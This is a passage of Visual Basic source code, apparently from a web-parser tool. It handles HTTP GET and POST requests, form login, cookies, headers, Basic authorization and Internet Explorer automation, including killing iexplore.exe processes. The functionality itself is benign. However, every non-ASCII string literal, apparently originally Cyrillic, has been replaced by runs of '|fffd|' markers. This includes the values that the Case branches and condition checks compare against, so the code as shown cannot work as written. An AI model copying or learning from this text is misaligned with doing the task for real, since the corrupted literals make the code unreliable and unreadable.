                                "<p>URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http:// |fffd||fffd||fffd| |fffd| https://</p>", bt_Warning
                        Else
                            AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & _
                                "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Cookies|fffd|" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
                        End If
                    End If
                    
                End If
                
            Case "WinHTTP_POST"
                
                If Len(parameters("POST")) Then
                    URL$ = IIf(IsURL(Trim(parameters("URL"))), Trim(parameters("URL")), Trim(txt))
                    If IsURL(URL$) Then
                        LAST_USED_URL$ = URL$
                        PageLoadRequested URL$
                        txt = LoadFromURL_HTML(URL$, WP, parameters("Encoding"), parameters("POST"), parameters("CacheMode"))
                    Else
                        txt = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (URL) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                            If Len(URL$) Then
                                URL$ = IIf(Len(URL$) > 100, Left(URL$, 35) & " ... " & Right(URL$, 35), URL$)
                                AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & vbNewLine & "<span style='color:red;'>" & URL$ & "</span>" & vbNewLine & _
                                    "<p>URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http:// |fffd||fffd||fffd| |fffd| https://</p>" & vbNewLine & DEBUG_GetErrorPoint, bt_Warning
                            Else
                                AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
                            End If
                        End If
                    End If
                Else
                    WP.SetError "POST-|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "!URL", URL$, True
                End If
                
            Case "WinHTTP_Open"
                URL$ = IIf(IsURL(Trim(parameters("URL"))), Trim(parameters("URL")), Trim(txt))
                If IsURL(URL$) Then
                    LAST_USED_URL$ = URL$
                    PageLoadRequested URL$
                    If URL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then URL$ = ConvertURLtoPunycode(URL$)
                    
                    Select Case parameters("Method")
                        Case "GET"
                            PostData = "": http.Open "GET", URL$, False
                        Case "POST"
                            http.Open "POST", URL$, False
                        Case Else
                            PostData = "": http.Open parameters("Method"), URL$, False
                    End Select
                    If WP.Options.UseClientCertificate Then http.SetClientCertificate WP.Options.ClientCertificateName
                    WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
                    PostData = ""
                Else
                    txt = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (URL) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                        If Len(URL$) Then
                            URL$ = IIf(Len(URL$) > 100, Left(URL$, 35) & " ... " & Right(URL$, 35), URL$)
                            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & vbNewLine & "<span style='color:red;'>" & URL$ & "</span>" & vbNewLine & _
                                "<p>URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http:// |fffd||fffd||fffd| |fffd| https://</p>" & vbNewLine & DEBUG_GetErrorPoint, bt_Warning
                        Else
                            AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| " & parameters("Method") & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
                        End If
                    End If
                End If
                
            Case "WinHTTP_AddPOSTdata"
                Select Case parameters("Encoding")
                    Case "UrlEncode", ""
                        param$ = URL_Encode1(parameters("Value"))
                    Case "UrlEncode2"
                        param$ = URL_Encode2(parameters("Value"))
                    Case "UrlEncode3"
                        param$ = URL_Encode3(parameters("Value"))
                    Case "UrlEncode4"
                        param$ = URL_Encode4(parameters("Value"))
                    Case Else
                        param$ = ChangeTextCharset(parameters("Value"), parameters("Encoding"))
                End Select
                PostData = PostData & IIf(Len(PostData), "&", "") & Trim(parameters("Name")) & _
                    IIf(Trim(parameters("Name")) = "", "", "=") & param$
                
                'Debug.Print "=" & Parameters("Value") & "="
                'Debug.Print "=" & param$ & "="
                
            Case "WinHTTP_AddPOSTdata2"
                PostData = PostData & IIf(Len(PostData), "&", "") & parameters("POST")
                
            Case "WinHTTP_ClearPOSTdata": PostData = ""
                
            Case "POST_Auth"
                URL$ = Trim(parameters("URL"))
                If IsURL(URL$) Then
                    Dim BaseURL$, AuthPostData$, CheckCommand$, UseFormData As Boolean, FormHTML$
                    UseFormData = Len(Trim(parameters("FormURL"))) > 0
                    If UseFormData Then
                        BaseURL$ = Trim(parameters("FormURL"))
                    Else
                        BaseURL$ = GetBaseURL(URL$)
                    End If
                    
                    WP.PrInd1.line1 = tt("PI_Auth_Preparing") & " ..."
                    CreateNewInstanceOfWinHttpRequest WP
                    LAST_USED_URL$ = BaseURL$: PageLoadRequested BaseURL$
                    
                    
                    If TEST_ACTIONS_MODE Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b><br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CreateHTMLlink(BaseURL$), bt_Information
                    
                    If BaseURL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then BaseURL$ = ConvertURLtoPunycode(BaseURL$)
                    
                    AddStandartHeadersIntoStore BaseURL$
                    PostData = "": wHTTP.Open "GET", BaseURL$, False
                    If WP.Options.UseClientCertificate Then wHTTP.SetClientCertificate WP.Options.ClientCertificateName
                    WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
                    AddRequestHeadersFromStore
                    
                    WinHTTP_Send True, WP
                    DoEvents
                    
                    If UseFormData Then
                        FormHTML$ = WinHTTP_getResponseText  ' Parameters("Encoding")
                        AuthPostData$ = LoadFormData(FormHTML$, parameters("FormFilter"), parameters("POST"), , , "|fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|)")
                        
                        If TEST_ACTIONS_MODE Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b><br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:<br />" & _
                            FormatTextForBalloon(AuthPostData$), bt_Information
                    Else
                        AuthPostData$ = Trim(parameters("POST"))
                    End If
                    
                    LAST_USED_URL$ = URL$: PageLoadRequested URL$
                    If URL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then URL$ = ConvertURLtoPunycode(URL$)
                    
                    AddStandartHeadersIntoStore URL$        ' overwriting some old headers
                    
                    WP.PrInd1.line1 = tt("PI_Auth_InProgress") & " ..."
                    If TEST_ACTIONS_MODE Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|<br />" & _
                        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cookies:<br />" & FormatTextForBalloon(GetCookiesFromStore), bt_Information
                    
                    wHTTP.Open "POST", URL$, False
                    If WP.Options.UseClientCertificate Then wHTTP.SetClientCertificate WP.Options.ClientCertificateName
                    WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
                    AddRequestHeadersFromStore
                    If Not CookiesStore Is Nothing Then wHTTP.SetRequestHeader "Cookie", GetCookiesFromStore
                    WinHTTP_Send True, WP, AuthPostData$
                    DoEvents
                    
                    WP.PrInd1.line1 = tt("PI_Auth_GotAnswer")
                    
                    Dim CurrentURL$, SourceString$, TextForSearch$, Condition$
                    CurrentURL$ = wHTTP.Option(WinHttpRequestOption_URL)
                    
                    If parameters("LoadFrontPageWhenDone") = "|fffd||fffd|" Then
                        SourceString$ = LoadFromURL_HTML(GetBaseURL(URL$), WP)
                    Else
                        SourceString$ = WinHTTP_getResponseText         ' Parameters("Encoding")
                    End If
                    txt = SourceString$
                    
                    CheckCommand$ = LTrim(parameters("CheckCommand"))
                    If Len(CheckCommand$) Then        ' checking of auth done
                        Select Case True
                            
                            Case Left(CheckCommand$, 1) = "+"
                                TextForSearch$ = Mid(CheckCommand$, 2)
                                Condition$ = "INSTR"
                            Case Left(CheckCommand$, 1) = "-"
                                TextForSearch$ = Mid(CheckCommand$, 2)
                                Condition$ = "!INSTR"
                                
                            Case Left(CheckCommand$, 2) = "R+"
                                SourceString$ = CurrentURL$
                                TextForSearch$ = Mid(CheckCommand$, 3)
                                Condition$ = "INSTR"
                            Case Left(CheckCommand$, 2) = "R-"
                                SourceString$ = CurrentURL$
                                TextForSearch$ = Mid(CheckCommand$, 3)
                                Condition$ = "!INSTR"
                                
                            Case Left(CheckCommand$, 2) = "C+", Left(CheckCommand$, 2) = "|fffd|+"
                                SourceString$ = GetCookiesFromStore & " "
                                TextForSearch$ = Mid(CheckCommand$, 3)
                                Condition$ = "INSTR"
                            Case Left(CheckCommand$, 2) = "C-", Left(CheckCommand$, 2) = "|fffd|-"
                                SourceString$ = GetCookiesFromStore & " "
                                TextForSearch$ = Mid(CheckCommand$, 3)
                                Condition$ = "!INSTR"
                                
                            Case Else: Condition$ = ""
                        End Select
                        
                        If (Len(Condition$) > 0) And (Len(TextForSearch$) > 0) And (Len(SourceString$) > 0) Then
                            If Not CheckCondition(SourceString$, Condition$, TextForSearch$) Then
                                BaseURL$ = Replace(Split(GetBaseURL(URL$), "//")(1), "www.", "")
                                MsgBox tt("PI_Auth_Error", BaseURL$), vbCritical, tt("PI_Auth_ErrorCaption")
                                ApplyNormalActionToText = -9
                            End If
                        End If
                    End If
                    
                    WP.PrInd1.line1 = ""
                    
                    Err.Clear
                End If
                
                
            Case "WinHTTP_setRequestHeader"
                If RequestHeadersStore Is Nothing Then Set RequestHeadersStore = New Dictionary
                
                http.SetRequestHeader Trim(parameters("Name")), Trim(parameters("Value"))
                If parameters("Global") Like "*|fffd||fffd|*" Then
                    RequestHeadersStore.item(Trim(parameters("Name"))) = Trim(parameters("Value"))
                End If
                
                
            Case "WinHTTP_Send_getResponse"        ' new version (2 in 1)
                Err.Clear
                AddRequestHeadersFromStore
                Dim KeepCookies As Boolean: KeepCookies = LCase(parameters("Cookies")) = "|fffd||fffd|"
                Dim RenewWinHTTP As Boolean: RenewWinHTTP = LCase(parameters("RenewWinHTTP")) = "|fffd||fffd|"
                WinHTTP_Send KeepCookies, WP, PostData, RenewWinHTTP
                txt$ = WinHTTP_getResponseText(parameters("Encoding"))
                If WP.Options.RemoveScripts Then txt = RemoveTags(txt, "script")
                If WP.Options.RemoveIFrames Then txt = RemoveTags(txt, "iframe")
                Err.Clear
                
            Case "WinHTTP_AddCookie"
                If Len(parameters("Name")) Then
                    If CookiesStore Is Nothing Then Set CookiesStore = New Dictionary
                    CookiesStore.item(parameters("Name")) = parameters("Value")
                    If TEST_ACTIONS_MODE Then AddBalloon "Add cookie by parser: " & parameters("Name") & " = " & parameters("Value"), bt_Attention
                End If
                
            Case "WinHTTP_DeleteCookie"
                If Len(parameters("Name")) Then
                    If Not CookiesStore Is Nothing Then DeleteCookiesFromStore parameters("Name")
                End If
                
            Case "WinHTTP_DeleteRequestHeader"
                If Len(parameters("Name")) Then DeleteRequestHeadersFromStore parameters("Name")
                
            Case "WinHTTP_Send":
                Err.Clear
                AddRequestHeadersFromStore
                KeepCookies = LCase(parameters("Cookies")) = "|fffd||fffd|"
                WinHTTP_Send KeepCookies, WP, PostData
                'If Err Then txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & ": " & Err.Description
                Err.Clear
                
            Case "WinHTTP_getResponseText"
                txt$ = WinHTTP_getResponseText(parameters("Encoding"))
                If WP.Options.RemoveScripts Then txt = RemoveTags(txt, "script")
                If WP.Options.RemoveIFrames Then txt = RemoveTags(txt, "iframe")
                Err.Clear
                
            Case "ShowResponseHeaders"
                Err.Clear: Dim httpStatus: httpStatus = http.Status
                If Err Then
                    txt$ = ResponseHeadersFromCache
                Else
                    txt$ = "StatusCode=" & http.Status & vbNewLine & "URL=" & http.Option(WinHttpRequestOption_URL) & vbNewLine & vbNewLine & _
                        DecodeUTF8(http.GetAllResponseHeaders)
                End If
                Err.Clear
                
            Case "GetRedirectLocation"
                txt$ = GetRedirectLocation(DecodeUTF8(http.GetAllResponseHeaders), http.Option(WinHttpRequestOption_URL))
                Err.Clear
                
            Case "WinHTTP_Recreate"
                CreateNewInstanceOfWinHttpRequest WP, parameters("ClearCookiesAndHeaders") = "|fffd||fffd||fffd|"
                
            Case "WinHTTP_Option_URL"
                txt = http.Option(WinHttpRequestOption_URL)
                Err.Clear
                
            Case "WinHTTP_BasicAuthorization"
                Select Case parameters("Action")
                    Case "get string"
                        txt = GetBasicAuthorizationString(parameters("Login"), parameters("Password"))
                    Case "set header"
                        SetBasicAuthorizationHeader parameters("Login"), parameters("Password")
                    Case "set global header"
                        SetBasicAuthorizationHeader parameters("Login"), parameters("Password"), True
                End Select
                
                
            Case "LoadHTML"
                URL$ = IIf(IsURL(Trim(parameters("URL"))), Trim(parameters("URL")), Trim(txt))
                If IsURL(URL$) Then
                    LAST_USED_URL$ = URL$
                    PageLoadRequested URL$
                    
                    Dim pager$: pager$ = parameters("Pager")
                    If pager$ = "" Then
                        txt = LoadFromURL_HTML(URL$, WP, parameters("Encoding"), , parameters("CacheMode"))
                        If WP.Options.RemoveScripts Then txt = RemoveTags(txt, "script")
                        If WP.Options.RemoveIFrames Then txt = RemoveTags(txt, "iframe")
                    Else
                        txt = LoadFromURL_usingPager(URL$, WP, parameters("Encoding"), pager$, , parameters("CacheMode"))     ', Parameters("ActionSetName"))
                    End If
                Else
                    txt = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                        If Len(URL$) Then
                            URL$ = IIf(Len(URL$) > 100, Left(URL$, 35) & " ... " & Right(URL$, 35), URL$)
                            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & vbNewLine & "<span style='color:red;'>" & URL$ & "</span>" & vbNewLine & _
                                "<p>URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http:// |fffd||fffd||fffd| |fffd| https://</p>" & vbNewLine & DEBUG_GetErrorPoint, bt_Warning
                        Else
                            AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & _
                                "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
                        End If
                    End If
                    
                End If
                
            Case "IE_Start"
                If Not IE Is Nothing Then IE.Quit
                Set IE = New SHDocVw.InternetExplorer        'CreateObject("InternetExplorer.Application")
                
            Case "IE_Quit"
                Dim objWMI As Object, objProcess As Object, objProcesses As Object
                Select Case parameters("URL")
                    Case "", "active"
                        If Not IE Is Nothing Then IE.Quit
                        
                    Case "all"
                        
                        Set objWMI = GetObject("winmgmts://.")
                        Set objProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'iexplore.exe'")
                        For Each objProcess In objProcesses
                            Call objProcess.Terminate
                        Next
                        Set objProcesses = Nothing: Set objWMI = Nothing
                        
                    Case "all v.2"
                        Set objWMI = GetObject("winmgmts://.")
                        Set objProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'iexplore.exe'")
                        n = objProcesses.Count
                        For Each objProcess In objProcesses
                            Shell "taskkill /f /PID " & CStr(objProcess.ProcessID), vbHide
                            n = n - 1
                        Next
                        Set objProcesses = Nothing: Set objWMI = Nothing
                        
                End Select
                Set IE = Nothing
                
            Case "IE_ConnectToExisting"
                txt = ShowRunningIE(parameters("URL"), parameters("ActivateWindow") Like "|fffd||fffd|")
                
            Case "IE_Navigate"
                Err.Clear: Dim X: X = IE.Hwnd
                If (Err.Number <> 0) Or (IE Is Nothing) Then Set IE = New SHDocVw.InternetExplorer         'CreateObject("InternetExplorer.Application")
                Set IE.document = Nothing
                For i = 1 To 1000: DoEvents
                Next
                
                URL$ = IIf(IsURL(Trim(parameters("URL")), True), Trim(parameters("URL")), txt)
                If Trim(parameters("URL")) Like "javascript:*" Then URL$ = Trim(parameters("URL"))
                
                If IsURL(URL$, True) Then
                    LAST_USED_URL$ = URL$
                    PageLoadRequested URL$
                    txt = LoadFromURL_IE(URL$, parameters("Mask"), WP).text
                ElseIf URL$ Like "javascript:*" Then
                    txt = LoadFromURL_IE(URL$, parameters("Mask"), WP).text
                Else
                    txt = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                        If Len(URL$) Then
                            URL$ = IIf(Len(URL$) > 100, Left(URL$, 35) & " ... " & Right(URL$, 35), URL$)
                            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & vbNewLine & "<span style='color:red;'>" & URL$ & "</span>" & vbNewLine & _
                                "<p>URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http:// |fffd||fffd||fffd| |fffd| https://, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| javascript:, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|</p>", bt_Warning
                        Else
                            AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & _
                                "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE|fffd|" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
                        End If
                    End If
                End If
                
            Case "IE_Scroll"
                txt = ActionIE_Scroll(Val(parameters("Timeout")), parameters("LinkToClick"), _
                    Val(Trim(parameters("MaxScrolls"))), WP, parameters("CacheURL"))
                
            Case "IE_Click"
                txt = IE_Click(txt, WP)
                
            Case "IE_GetElement"
                txt = IE_GetElement(parameters("SearchMode"), parameters("SearchParam"), parameters("Action"), _
                    parameters("Value"), parameters("Events"), WP)
                
            Case "IE_Visible"
                If Not IE Is Nothing Then
                    Dim vis As Boolean: vis = parameters("Visible") Like "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    IE.Visible = vis
                End If
                
            Case "IE_WaitForData"
                txt = ActionIE_WaitForData(Val(parameters("Timeout")), parameters("Mask"))
                
            Case "IE_LocationURL"
                txt = "": txt = IE.LocationURL
                
            Case "IE_GetCookies"
                res = "": res = IE.document.Cookie
                If parameters("ReturnValue") = "|fffd||fffd|" Then txt = res
                ParserVariables.item("%CookiesIE%") = res
                
                If parameters("Apply") = "|fffd||fffd|" Then
                    SaveCookiesFromResponseHeaders "Set-Cookie: " & res & vbNewLine, True
                End If
                
            Case "CheckCondition"
                Dim CheckValue$
                Select Case parameters("UseAnotherValue")
                    Case "|fffd||fffd|": CheckValue$ = parameters("Value")
                    Case "|fffd||fffd||fffd|", "": CheckValue$ = txt
                    Case "tag": CheckValue$ = GetTags(txt, Trim(parameters("Value")), , , "ConvertToText 1")
                End Select
                
                If CheckCondition(CheckValue$, parameters("Condition"), parameters("Pattern")) Then
                    param$ = Trim(parameters("Parameter"))
                    
                    Select Case Trim(parameters("Action"))
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            txt = parameters("Parameter")
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd|"
                            txt = parameters("Parameter") & txt
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
                            txt = txt & parameters("Parameter")
                            
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            Dim VarName$: VarName$ = "%counter" & Val(parameters("Parameter")) & "%"
                            ParserVariables.item(VarName$) = Val(ParserVariables.item(VarName$)) + 1
                        Case "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            txt = parameters("Parameter")
                            ApplyNormalActionToText = -1
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            txt = ""
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            ApplyNormalActionToText = Val(param$)
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            ApplyNormalActionToText = Val(param$)
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            MsgBox param$, vbExclamation
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            AddBalloon param$, bt_Attention
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                            MsgBox param$, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & WP.Name & "|fffd|)"
                            ApplyNormalActionToText = -9
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            ASet_name$ = parameters("Parameter")
                            If Len(ASet_name$) Then
                                tmp_txt$ = txt$: WP.AASets.GetItemByName(ASet_name$).Execute tmp_txt$
                                txt$ = tmp_txt$
                            Else
                                Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ASet_name$ & "|fffd|"
                            End If
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            ASet_name$ = parameters("Parameter")
                            If Len(ASet_name$) Then
                                WP.AASets.GetItemByName(ASet_name$).Execute txt$
                            Else
                                Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ASet_name$ & "|fffd|"
                            End If
                        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                            ParserName$ = Split(parameters("Parameter"), PARSER_EXT$)(0)
                            If Len(ParserName$) Then
                                Set AllWPs = AllParsers
                                If AllWPs.ParserExists(ParserName$) Then
                                    Set WPtoRun = AllWPs.AddFromXML(PARSERS_FOLDER$ & ParserName$ & PARSER_EXT$, True)
                                    If Not WPtoRun Is Nothing Then
                                        Dim WP_dic As New Dictionary
                                        WP_dic.Add "ParentParserValue", txt
                                        WPtoRun.ExternalStart = True
                                        Set WPtoRun.Parent = WP
                                        WPtoRun.Run WP_dic
                                        'StopMacro = False
                                        Set WP_dic = Nothing
                                    End If
                                    Set RunningParser = WP
                                    ParserVariables.item("{ParserName}") = WP.Name
                                Else
                                    WP.SetError "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ParserName$ & "|fffd|"
                                End If
                                Set WPtoRun = Nothing: Set AllWPs = Nothing
                                StopMacro = WP.StopRequested
                            Else
                                WP.SetError "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                            End If
